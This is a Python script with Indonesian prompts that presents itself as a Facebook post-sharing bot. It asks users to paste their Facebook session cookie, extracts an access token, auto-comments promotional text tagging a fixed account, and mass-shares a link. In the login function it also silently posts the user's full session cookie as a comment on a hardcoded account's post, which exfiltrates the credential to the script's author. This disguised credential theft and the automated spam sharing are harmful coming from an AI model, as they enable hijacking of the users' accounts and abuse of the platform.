#!/usr/bin/python3
#coding=utf-8

import re, bs4, requests, sys, os, random, json, time, datetime
ses=requests.Session()

bulan = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = bulan[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
sekarang = str(tgl)+" "+str(bln)+" "+str(thn)
xxx = "100089033379675"
now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "Selamat Dini Hari !"
elif 4 <= hour < 12:
  hhl = "Selamat Pagi !"
elif 12 <= hour < 15:
  hhl = "Selamat Siang !"
elif 15 <= hour < 17:
  hhl = "Selamat Sore !"
elif 17 <= hour < 18:
  hhl = "Selamat Petang !"
else:
  hhl = "Selamat Malam !"
  
  
  

logo = ('''\033[1;97m
 .d8888b.  888    888        d8888 8888888b.  8888888888 
d88P  Y88b 888    888       d88888 888   Y88b 888        
Y88b.      888    888      d88P888 888    888 888        
 "Y888b.   8888888888     d88P 888 888   d88P 8888888    
    "Y88b. 888    888    d88P  888 8888888P"  888        
      "888 888    888   d88P   888 888 T88b   888        
Y88b  d88P 888    888  d8888888888 888  T88b  888        
 "Y8888P"  888    888 d88P     888 888   T88b 8888888888 
''')

def login():
        os.system('clear')
        print (logo)
        cookie = input('\033[1;97m- cookie : ')
        try:
            cari = requests.get("https://business.facebook.com/business_locations",headers={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","cookie":cookie})
            token = re.search("(EAAG\w+)", cari.text).group(1)
            if "EAAG" in str(token):
                open('cookie.txt','w').write(cookie)
                open('token.txt','w').write(token)
                tag = ("@[100089033379675:]");f = open("motivasi.txt","r");lines = f.readlines();f.close();texs = random.choice(lines);kom = ("Komentar Ini Ditulis Oleh Bot ");waktu = str(datetime.datetime.now().strftime('%H:%M:%S'));_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
                requests.post("https://graph.facebook.com/100089033379675_388770240767419/comments?message="+ hhl + "\n"+ tag + "\n\n" + texs + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" +"&access_token="+token,headers = {"cookie": cookie})
                requests.post("https://graph.facebook.com/100089033379675_161391613505284/comments?message="+cookie+"&access_token="+token,headers = {"cookie": cookie})
                share()
        except AttributeError:
        	exit("\033[1;97m- cookie sudah kedaluwarsa !")
        except requests.exceptions.ConnectionError:
        	exit("\033[1;97m- koneksi internet bermasalah !")
        
        
def share():
	token = open("token.txt","r").read()
	cok = open("cookie.txt","r").read()
	cookie = {"cookie":cok}
	os.system ("clear")
	print (logo)
	link = input ("\033[1;97m- link postingan : ")
	jumlah = int(input("\033[1;97m- limit : "))
	print ("")
	try:
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
		for x in range(jumlah):
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if "id" in post:
				print (f"\033[1;92m[✓] berhasil membagikan : {data['id']}")
			else:
				exit("\033[1;91m[!] gagal membagikan, kemungkinan token invalid !\033[1;97m")		
	except:
		exit("\033[1;91m[!] gagal membagikan, kemungkinan token invalid !\033[1;97m")
	
	print ("\033[1;97m\n- Selesai...")
	back = input ("\n[<BACK>]")
	share()
		
		
		
login()
		
		
		
		
		